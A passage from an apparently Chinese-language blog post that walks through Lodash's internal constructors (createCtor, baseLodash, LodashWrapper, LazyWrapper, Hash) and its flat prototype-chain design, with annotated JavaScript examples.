      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>], args[<span class="hljs-number">3</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>], args[<span class="hljs-number">3</span>], args[<span class="hljs-number">4</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>], args[<span class="hljs-number">3</span>], args[<span class="hljs-number">4</span>], args[<span class="hljs-number">5</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>], args[<span class="hljs-number">3</span>], args[<span class="hljs-number">4</span>], args[<span class="hljs-number">5</span>], args[<span class="hljs-number">6</span>]);
    }
    <span class="hljs-comment">// 通用场景：模拟 new 关键字行为</span>
    <span class="hljs-keyword">var</span> thisBinding = <span class="hljs-title function_">baseCreate</span>(<span class="hljs-title class_">Ctor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
    <span class="hljs-keyword">var</span> result = <span class="hljs-title class_">Ctor</span>.<span class="hljs-title function_">apply</span>(thisBinding, args);
    <span class="hljs-comment">// 严格遵循 ES 规范：构造函数返回对象则覆盖实例</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">isObject</span>(result) ? result : thisBinding;
  };
}

<span class="hljs-comment">// ES6 class 兼容验证</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-string">`Hi <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>; }
}
<span class="hljs-keyword">var</span> userCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">User</span>);
<span class="hljs-keyword">var</span> user = <span class="hljs-title function_">userCtor</span>(<span class="hljs-string">'Tom'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-title function_">sayHi</span>()); <span class="hljs-comment">// Hi Tom</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">User</span>); <span class="hljs-comment">// true</span>
</code></pre>
<h6 data-id="heading-7">解决 “忘记写 new” 导致的逻辑错误</h6>
<p>JavaScript 中，构造函数的正确调用依赖 <code>new</code> 关键字，但新手（甚至资深开发者）很容易遗漏，导致 <code>this</code> 指向错误（浏览器中指向 <code>window</code>，Node.js 中指向 <code>global</code>），进而引发难以排查的 bug。</p>
<p><strong>没有 createCtor 的问题场景</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// 忘记 new 时，this 指向全局</span>
}
<span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-string">`Hi <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;

<span class="hljs-comment">// 错误调用：没写 new</span>
<span class="hljs-keyword">var</span> u1 = <span class="hljs-title class_">User</span>(<span class="hljs-string">'Tom'</span>); 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u1); <span class="hljs-comment">// undefined（构造函数无返回值）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// Tom（全局被污染）</span>

<span class="hljs-comment">// 正确调用：写 new</span>
<span class="hljs-keyword">var</span> u2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">'Jerry'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u2.<span class="hljs-property">name</span>); <span class="hljs-comment">// Jerry</span>
</code></pre>
<p><strong>有 createCtor 的解决效果：</strong></p>
<p>通过 <code>createCtor</code> 包装后，无论是否写 <code>new</code>，都能正确创建实例，避免全局污染和逻辑错误：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> userCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">User</span>);

<span class="hljs-comment">// 无 new 调用（新手易错场景）</span>
<span class="hljs-keyword">var</span> u1 = <span class="hljs-title function_">userCtor</span>(<span class="hljs-string">'Tom'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u1.<span class="hljs-property">name</span>); <span class="hljs-comment">// Tom（this 指向正确）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">User</span>); <span class="hljs-comment">// true（仍是 User 实例）</span>

<span class="hljs-comment">// 有 new 调用（正常场景）</span>
<span class="hljs-keyword">var</span> u2 = <span class="hljs-keyword">new</span> <span class="hljs-title function_">userCtor</span>(<span class="hljs-string">'Jerry'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u2.<span class="hljs-property">name</span>); <span class="hljs-comment">// Jerry</span>
</code></pre>
<h6 data-id="heading-8">优化构造函数调用的性能</h6>
<p>JavaScript 中，<code>new Ctor.apply(this, args)</code> 这种 “通用调用方式” 性能较差（需要解构参数数组），而 <code>createCtor</code> 针对<strong>0-7 个参数</strong>（覆盖 90%+ 的实际开发场景）做了专门优化：</p>
<ul>
<li>0-7 个参数直接用 <code>new Ctor(参数1, 参数2...)</code> 调用，避免参数数组解构的开销；</li>
<li>仅当参数超过 7 个时，才使用 <code>baseCreate + apply</code> 的通用方式。</li>
</ul>




















<table><thead><tr><th>调用方式</th><th>执行时间</th><th>性能提升</th></tr></thead><tbody><tr><td>new Ctor(args[0], args[1])</td><td>~10ms</td><td>基准</td></tr><tr><td>Ctor.apply(thisBinding, args)</td><td>~13ms</td><td>慢 30%+</td></tr></tbody></table>
<p><code>createCtor</code> 优先使用高性能的直接调用方式，仅在极端场景（参数 &gt; 7）降级到通用方式，兼顾了 “常见场景性能” 和 “全场景兼容”。</p>
<h6 data-id="heading-9">严格遵循 ES 规范的构造函数返回规则</h6>
<p>JavaScript 构造函数有一个易被忽略的规则：<strong>如果构造函数返回一个对象（包括数组、函数、普通对象），则 <code>new</code> 表达式会返回这个对象，而非创建的实例</strong>；如果返回非对象（如基本类型、undefined），则返回实例。</p>
<p><code>createCtor</code> 完美模拟了这一规则，确保包装后的构造函数行为和原生完全一致：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 构造函数返回对象（覆盖实例）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">model</span>: <span class="hljs-string">'Model 3'</span> }; <span class="hljs-comment">// 返回对象</span>
}

<span class="hljs-keyword">var</span> carCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">Car</span>);
<span class="hljs-keyword">var</span> car = <span class="hljs-title function_">carCtor</span>(<span class="hljs-string">'Tesla'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(car.<span class="hljs-property">brand</span>); <span class="hljs-comment">// undefined（实例被覆盖）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(car.<span class="hljs-property">model</span>); <span class="hljs-comment">// Model 3（返回构造函数的对象）</span>

<span class="hljs-comment">// 构造函数返回非对象（返回实例）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Phone</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
  <span class="hljs-keyword">return</span> <span class="hljs-string">'iPhone'</span>; <span class="hljs-comment">// 返回字符串（非对象）</span>
}
<span class="hljs-keyword">var</span> phoneCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">Phone</span>);
<span class="hljs-keyword">var</span> phone = <span class="hljs-title function_">phoneCtor</span>(<span class="hljs-string">'Apple'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(phone.<span class="hljs-property">brand</span>); <span class="hljs-comment">// Apple（返回实例）</span>
</code></pre>
<p>如果没有 <code>createCtor</code>，手动模拟这一规则需要写大量重复代码，而 Lodash 把这一逻辑封装成工具，内部所有构造函数调用都能复用。</p>
<h6 data-id="heading-10">兼容 ES6 class 等新型构造函数</h6>
<p>ES6 的 <code>class</code> 本质是构造函数的语法糖，但有一个限制：<strong>class 必须用 <code>new</code> 调用，直接调用会抛错</strong>。<code>createCtor</code> 能兼容这一特性，让 class 和传统构造函数的调用方式保持统一：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ES6 class 直接调用会报错</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; }
}
<span class="hljs-title class_">User</span>(<span class="hljs-string">'Tom'</span>); <span class="hljs-comment">// Uncaught TypeError: Class constructor User cannot be invoked without 'new'</span>

<span class="hljs-comment">// 经 createCtor 包装后，无 new 也能正确调用</span>
<span class="hljs-keyword">var</span> userCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">User</span>);
<span class="hljs-keyword">var</span> u = <span class="hljs-title function_">userCtor</span>(<span class="hljs-string">'Tom'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u.<span class="hljs-property">name</span>); <span class="hljs-comment">// Tom</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">User</span>); <span class="hljs-comment">// true</span>
</code></pre>
<h6 data-id="heading-11">Lodash 内部逻辑统一复用</h6>
<p>Lodash 内部有大量自定义构造函数（如 <code>LodashWrapper</code>、<code>LazyWrapper</code>、<code>Hash</code>），如果每个构造函数都手动处理 “调用方式、性能、返回规则”，会导致代码冗余且易出错。</p>
<p><code>createCtor</code> 作为通用工具，让 Lodash 内部所有构造函数的调用逻辑保持一致：</p>
<ul>
<li>无需为每个构造函数写重复的 “new 检测、参数处理、返回值判断” 代码；</li>
<li>后续修改构造函数调用规则（如优化性能、兼容新规范），只需改 <code>createCtor</code> 一处即可。</li>
</ul>
<h4 data-id="heading-12">（2）<code>baseLodash</code> 完整定义</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 所有包装器的原型根，抽离通用方法避免重复定义</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">baseLodash</span>(<span class="hljs-params"/>) {}

<span class="hljs-comment">// 挂载通用核心方法（所有包装器共享）</span>
baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 执行操作队列并返回最终结果（不同包装器会重写此方法适配逻辑）</span>
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span>;
};
baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">chain</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 开启链式模式</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__chain__</span> = <span class="hljs-literal">true</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
};
</code></pre>
<h4 data-id="heading-13">（3）<code>LodashWrapper</code> 完整构造函数与原型设置</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LodashWrapper</span>(<span class="hljs-params">value, chainAll</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span> = value;       <span class="hljs-comment">// 存储原始值（支持任意类型）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span> = [];          <span class="hljs-comment">// 存储待执行的操作队列</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__chain__</span> = !!chainAll;    <span class="hljs-comment">// 标记是否开启全局链式模式</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__index__</span> = <span class="hljs-number">0</span>;             <span class="hljs-comment">// 遍历操作队列时的索引</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__values__</span> = <span class="hljs-literal">undefined</span>;    <span class="hljs-comment">// 缓存执行结果，避免重复计算</span>
}

<span class="hljs-comment">// 扁平原型链设计：继承 baseLodash.prototype 共享通用方法</span>
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">LodashWrapper</span>;

<span class="hljs-comment">// 重写 value 方法：执行操作队列并返回结果</span>
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">__values__</span> !== <span class="hljs-literal">undefined</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__values__</span>; <span class="hljs-comment">// 命中缓存直接返回</span>
  }
  <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span>;
  <span class="hljs-comment">// 依次执行操作队列中的所有方法</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, length = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>.<span class="hljs-property">length</span>; i &lt; length; i++) {
    <span class="hljs-keyword">var</span> action = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>[i];
    result = action.<span class="hljs-property">func</span>.<span class="hljs-title function_">apply</span>(action.<span class="hljs-property">thisArg</span>, [result].<span class="hljs-title function_">concat</span>(action.<span class="hljs-property">args</span>));
  }
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__values__</span> = result; <span class="hljs-comment">// 缓存结果</span>
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// 扩展核心方法：添加操作到队列（以 map 为例）</span>
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">map</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">func</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>.<span class="hljs-title function_">push</span>({
    <span class="hljs-attr">func</span>: <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">map</span>,
    <span class="hljs-attr">args</span>: [func],
    <span class="hljs-attr">thisArg</span>: <span class="hljs-literal">undefined</span>
  });
  <span class="hljs-comment">// 非链式模式直接返回结果，链式模式返回自身</span>
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__chain__</span> ? <span class="hljs-variable language_">this</span> : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">value</span>();
};
</code></pre>
<h4 data-id="heading-14">（4）<code>LazyWrapper</code> 完整构造函数与原型设置</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 定义常量：数组最大长度（用于默认 takeCount）</span>
<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">MAX_ARRAY_LENGTH</span> = <span class="hljs-number">4294967295</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">LazyWrapper</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span> = value;         <span class="hljs-comment">// 仅存储数组，惰性求值专为数组优化</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span> = [];            <span class="hljs-comment">// 存储操作描述，不立即执行</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span> = <span class="hljs-number">1</span>;                 <span class="hljs-comment">// 1=正向遍历，-1=反向遍历（适配 takeRight）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__filtered__</span> = <span class="hljs-literal">false</span>;        <span class="hljs-comment">// 标记是否有过滤操作，优化遍历逻辑</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__iteratees__</span> = [];          <span class="hljs-comment">// 存储 map/filter 等迭代器函数</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__takeCount__</span> = <span class="hljs-variable constant_">MAX_ARRAY_LENGTH</span>; <span class="hljs-comment">// 默认取最大长度，take 方法修改</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__views__</span> = [];              <span class="hljs-comment">// 存储数组视图，避免重复创建中间数组</span>
}

<span class="hljs-comment">// 扁平原型链设计：直接继承 baseLodash.prototype</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">LazyWrapper</span>;

<span class="hljs-comment">// 重写 value 方法：执行惰性操作（单次遍历+短路）</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">var</span> array = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span>;
  <span class="hljs-keyword">var</span> result = [];
  <span class="hljs-keyword">var</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span> === <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : array.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  <span class="hljs-keyword">var</span> end = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span> === <span class="hljs-number">1</span> ? array.<span class="hljs-property">length</span> : -<span class="hljs-number">1</span>;
  
  <span class="hljs-keyword">while</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span> === <span class="hljs-number">1</span> ? index &lt; end : index &gt; end) &amp;&amp; result.<span class="hljs-property">length</span> &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">__takeCount__</span>) {
    <span class="hljs-keyword">var</span> value = array[index];
    <span class="hljs-comment">// 对单个元素批量执行所有操作</span>
    <span class="hljs-keyword">var</span> computed = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">__compute</span>(value, index, array);
    <span class="hljs-keyword">if</span> (computed !== <span class="hljs-literal">undefined</span>) {
      result.<span class="hljs-title function_">push</span>(computed);
    }
    index += <span class="hljs-variable language_">this</span>.<span class="hljs-property">__dir__</span>;
  }
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// 核心辅助方法：批量执行单个元素的所有操作</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__compute</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">value, index, array, actions, iteratees</span>) {
  <span class="hljs-keyword">var</span> computed = value;
  actions = actions || <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; actions.<span class="hljs-property">length</span>; i++) {
    computed = actions[i].<span class="hljs-title function_">func</span>(computed, index, array);
    <span class="hljs-comment">// filter 不通过则终止后续操作，提升效率</span>
    <span class="hljs-keyword">if</span> (computed === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">break</span>;
  }
  <span class="hljs-keyword">return</span> computed;
};

<span class="hljs-comment">// 扩展 take 方法：设置短路阈值</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">take</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__takeCount__</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(n, <span class="hljs-variable language_">this</span>.<span class="hljs-property">__takeCount__</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
};
</code></pre>
<h4 data-id="heading-15">（5）<code>Hash</code> 完整构造函数与所有原型方法实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 定义常量：区分“值为undefined”和“键不存在”</span>
<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">HASH_UNDEFINED</span> = <span class="hljs-string">'__lodash_hash_undefined__'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Hash</span>(<span class="hljs-params">entries</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 无原型存储，避免键名冲突（如 toString）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-number">0</span>;                       <span class="hljs-comment">// 实时计数，无需遍历统计</span>
  
  <span class="hljs-comment">// 初始化传入的键值对</span>
  <span class="hljs-keyword">if</span> (entries &amp;&amp; entries.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; entries.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">var</span> entry = entries[i];
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">set</span>(entry[<span class="hljs-number">0</span>], entry[<span class="hljs-number">1</span>]);
    }
  }
}

<span class="hljs-comment">// 原型链设置</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Hash</span>;

<span class="hljs-comment">// 1. 设置键值对</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">set</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key, value</span>) {
  <span class="hljs-keyword">var</span> previous = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key];
  <span class="hljs-comment">// 用 HASH_UNDEFINED 占位 undefined，区分键不存在</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key] = value === <span class="hljs-literal">undefined</span> ? <span class="hljs-variable constant_">HASH_UNDEFINED</span> : value;
  <span class="hljs-comment">// 仅当键不存在时，size 加 1</span>
  <span class="hljs-keyword">if</span> (previous === <span class="hljs-literal">undefined</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
};

<span class="hljs-comment">// 2. 获取值</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">get</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key</span>) {
  <span class="hljs-keyword">var</span> value = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key];
  <span class="hljs-comment">// 还原 undefined 值</span>
  <span class="hljs-keyword">return</span> value === <span class="hljs-variable constant_">HASH_UNDEFINED</span> ? <span class="hljs-literal">undefined</span> : value;
};

<span class="hljs-comment">// 3. 判断键是否存在</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">has</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key] !== <span class="hljs-literal">undefined</span>;
};

<span class="hljs-comment">// 4. 删除键值对</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-string">'delete'</span>] = <span class="hljs-keyword">function</span>(<span class="hljs-params">key</span>) {
  <span class="hljs-keyword">var</span> existed = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(key);
  <span class="hljs-keyword">if</span> (existed) {
    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span>[key];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--;
  }
  <span class="hljs-keyword">return</span> existed;
};

<span class="hljs-comment">// 5. 清空所有键值对</span>
<span class="hljs-title class_">Hash</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">clear</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">__data__</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-number">0</span>;
};
</code></pre>
<h2 data-id="heading-16">三、原型链设计</h2>
<p>Lodash 采用<strong>扁平原型链设计</strong>，所有包装器直接继承 <code>baseLodash.prototype</code>，兼顾<strong>查找性能</strong>、<strong>接口统一</strong>和<strong>扩展灵活性</strong>，是其高效设计的核心之一。</p>
<h3 data-id="heading-17">1. 完整原型链结构与设置代码</h3>
<h4 data-id="heading-18">（1）结构示意图</h4>
<pre><code class="hljs language-javascript" lang="javascript">                  <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>
                        ↑
                        |
                baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>
                        ↑
                        |
        +---------------+---------------+
        |               |               |
lodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>  <span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>  <span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>
        |               |               |
        ↓               ↓               ↓
    lodash函数      <span class="hljs-title class_">LodashWrapper</span>实例   <span class="hljs-title class_">LazyWrapper</span>实例
</code></pre>
<h4 data-id="heading-19"/>
<h4 data-id="heading-20">（2）核心原型链设置代码</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 主函数（_）原型链设置</span>
lodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
lodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = lodash;

<span class="hljs-comment">// 2. 普通包装器原型链设置</span>
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">LodashWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">LodashWrapper</span>;

<span class="hljs-comment">// 3. 惰性包装器原型链设置</span>
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">LazyWrapper</span>;

